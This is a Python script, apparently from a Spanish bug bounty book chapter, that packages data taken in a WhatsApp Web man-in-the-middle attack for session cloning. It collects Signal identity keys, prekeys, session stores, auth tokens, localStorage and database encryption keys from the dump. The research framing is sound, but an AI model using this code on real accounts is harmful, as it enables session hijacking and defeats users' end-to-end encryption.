# Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
"""
session_clone.py -- Construccion del paquete de clonado
Demuestra que los datos exfiltrados son suficientes para
clonar la sesion de WhatsApp en otra maquina.
"""
import json
from pathlib import Path
from zipfile import ZipFile

EVIDENCE_DIR = Path("evidence")

def build_clone_package():
    raw = json.loads(
        (EVIDENCE_DIR / "full_dump" / "00_FULL_RAW_DUMP.json")
        .read_text()
    )

    # Componentes criticos para el clonado
    clone_data = {
        "metadata": {
            "source": "WA_WEB_URL MITM exfiltration",
            "purpose": "Security research"
        },

        # 1. Claves Signal -- nucleo del E2E
        "signal_identity": None,
        "signal_prekeys": None,
        "signal_sessions": None,
        "signal_signed_prekey": None,
        "signal_meta": None,

        # 2. Tokens de autenticacion
        "auth_tokens": None,
        "localStorage": None,

        # 3. Claves de cifrado de la BD local
        "db_encryption_keys": None,

        # 4. Claves de sincronizacion multi-dispositivo
        "sync_keys": None,
    }

    # Rellenar desde los datos exfiltrados
    if 'signal-storage' in raw and 'data' in raw['signal-storage']:
        sig = raw['signal-storage']['data']
        clone_data['signal_identity'] = sig.get('identity-store')
        clone_data['signal_prekeys'] = sig.get('prekey-store')
        clone_data['signal_sessions'] = sig.get('session-store')
        clone_data['signal_signed_prekey'] = \
            sig.get('signed-prekey-store')
        clone_data['signal_meta'] = sig.get('signal-meta-store')

    if 'localStorage' in raw:
        clone_data['localStorage'] = raw['localStorage']

    if 'wawc_db_enc' in raw and 'data' in raw['wawc_db_enc']:
        clone_data['db_encryption_keys'] = \
            raw['wawc_db_enc']['data']

    if 'model-storage' in raw and 'data' in raw['model-storage']:
        ms = raw['model-storage']['data']
        clone_data['sync_keys'] = ms.get('sync-keys')

    return clone_data
